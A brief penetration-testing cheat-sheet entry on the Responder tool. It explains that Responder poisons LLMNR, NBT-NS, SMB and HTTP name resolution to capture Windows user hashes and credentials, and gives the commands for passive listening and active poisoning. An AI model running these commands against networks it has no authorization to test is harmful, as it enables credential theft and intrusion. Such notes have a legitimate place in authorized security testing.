Responder responds to broadcast or targeted queries for many types of servers with postive results and prompts authentication from Windows domains, allowing us to gain user hashes and potentially credentials from the network. Syntaxes below. 

```shell
responder -I <interface> -A # Passive; do not respond, only listen

responder -I <interface> # Poisons all protocols (LLMNR, HTTP, SMB, NBT-NS, etc...)
```